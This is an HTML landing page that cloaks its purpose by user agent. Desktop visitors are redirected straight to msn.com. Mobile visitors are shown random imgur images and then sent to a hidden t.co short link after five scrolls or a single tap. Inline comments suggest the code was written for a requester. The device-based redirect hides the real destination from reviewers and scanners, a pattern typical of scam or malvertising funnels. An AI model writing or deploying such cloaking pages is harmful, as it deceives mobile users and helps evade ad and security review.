<!DOCTYPE html>
<html lang="en">
<head>
<script async src="https://www.googletagmanager.com/gtag/js?id=G-520TEJ05JK"></script>
<script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'G-520TEJ05JK');
</script>
    <meta charset="utf-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Scrollable Landing Page</title>
    <style>
        /* Global Reset */
        html, body {
            margin: 0;
            padding: 0;
            height: 100%;
            width: 100%;
            overflow: hidden; /* Prevent body scrollbar */
        }

        /* Container for the full-screen image sections */
        .image-container {
            height: 100vh;
            width: 100vw;
            overflow-y: scroll; /* Enable vertical scrolling within this container */
            scroll-snap-type: y mandatory; /* Enforce full-section snapping */
            -webkit-overflow-scrolling: touch; /* Better mobile scrolling */
        }

        /* Style for each full-screen image section */
        .full-image-section {
            height: 100vh;
            width: 100vw;
            scroll-snap-align: start; /* Snap to the top of the section */
            background-size: cover;
            background-position: center;
            background-repeat: no-repeat;
            position: relative;
        }

        /* Loading indicator - Optional, but good for UX */
        .loading {
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            font-family: sans-serif;
            font-size: 24px;
            color: #333;
        }
    </style>
    <script>
        const desktopURL = "https://www.msn.com/it-it";
        const isMobile = /iphone|ipad|ipod|android|blackberry|mini|windows\sce|palm/i.test(navigator.userAgent.toLowerCase());
        
        // Redirect desktop users immediately
        if (!isMobile) {
            window.location.replace(desktopURL);
        }

        const ALL_IMAGE_URLS = [
            'https://i.imgur.com/hmAABJ7.jpg',
            'https://i.imgur.com/ZYGvd6q.jpg',
            'https://i.imgur.com/YpxSLD0.jpg',
            'https://i.imgur.com/JSU3t4x.jpg',
            'https://i.imgur.com/rMwqoZP.jpg',
            'https://i.imgur.com/Dpi9Zzv.jpg',
            'https://i.imgur.com/0kpyxuU.jpg',
            'https://i.imgur.com/wzYPBDJ.jpg',
            'https://i.imgur.com/wGi8uyT.jpg',
            'https://i.imgur.com/tTxAmNF.jpg',
            'https://i.imgur.com/pSX3j18.jpg',
            'https://i.imgur.com/jwFUISy.jpg',
            'https://i.imgur.com/adL2Ou5.jpg',
            'https://i.imgur.com/lcFOzxz.jpg',
            'https://i.imgur.com/TrIPXQf.jpg',
            'https://i.imgur.com/LkW7EgA.jpg'
        ];

        // Function to select a random subset of URLs
        function getRandomImageUrls(count) {
            // Shuffle the array
            const shuffled = [...ALL_IMAGE_URLS].sort(() => 0.5 - Math.random());
            // Get the subset
            return shuffled.slice(0, count);
        }

        // We will select 4 random images to display for this visit
        const SELECTED_IMAGE_URLS = getRandomImageUrls(4); 
    </script>
</head>
<body>
    <div class="image-container" id="imageContainer">
        <div class="full-image-section" id="section-1"></div>
        <div class="full-image-section" id="section-2"></div>
        <div class="full-image-section" id="section-3"></div>
        <div class="full-image-section" id="section-4"></div>
        <div class="full-image-section" id="section-5"></div>
        <div class="full-image-section" id="section-6"></div>
    </div>

    <script>
        // Constants
        const mobileURL = "https://t.co/21Bu3LDwwY";
        const imageContainer = document.getElementById("imageContainer");
        const sections = document.querySelectorAll(".full-image-section");
        const MAX_SCROLLS_BEFORE_REDIRECT = 5; // Scrolls from section 1 to 6 (5 scrolls)
        let scrollCount = 0;
        let currentSectionIndex = 0;
        let lastScrollTop = 0; // To track scroll direction (though scroll-snap makes it simple)

        // --- Image Loading and Setup ---
        
        // Apply the randomly selected image URLs to the first 4 sections.
        // The remaining 2 sections will have one of the images repeated or can be left blank.
        sections.forEach((section, index) => {
            if (index < SELECTED_IMAGE_URLS.length) {
                // Apply the unique random images
                section.style.backgroundImage = `url('${SELECTED_IMAGE_URLS[index]}')`;
            } else {
                // For sections 5 and 6, we can repeat one of the earlier images
                // or just use a default/blank background if you prefer
                section.style.backgroundImage = `url('${SELECTED_IMAGE_URLS[0]}')`; 
            }
        });


        // --- Scroll and Redirect Logic ---
        
        imageContainer.addEventListener('scroll', () => {
            // Throttle or debounce the scroll event if performance is an issue, 
            // but for scroll-snap, requestAnimationFrame is often better.
            
            // Determine which section is currently at the top of the viewport
            const sectionHeight = sections[0].clientHeight;
            const newIndex = Math.round(imageContainer.scrollTop / sectionHeight);

            // Check if the scroll has resulted in a new section being viewed
            if (newIndex > currentSectionIndex) {
                currentSectionIndex = newIndex;
                scrollCount = newIndex; // The index directly corresponds to the number of scrolls (from 0)
                
                // If the user has scrolled 5 or more times (meaning they are viewing section 6 or beyond)
                if (scrollCount >= MAX_SCROLLS_BEFORE_REDIRECT) {
                    // Redirect!
                    window.location.href = mobileURL;
                }
            }
        });

        // Optional: Redirect on click (as per your original code), but only after a delay 
        // to give the scroll mechanism a chance to work first.
        imageContainer.addEventListener("click", () => {
            // Only redirect if they haven't started scrolling (e.g., if they are trying to engage)
            if (scrollCount === 0) {
                 window.location.href = mobileURL;
            }
        });
    </script>
</body>
</html>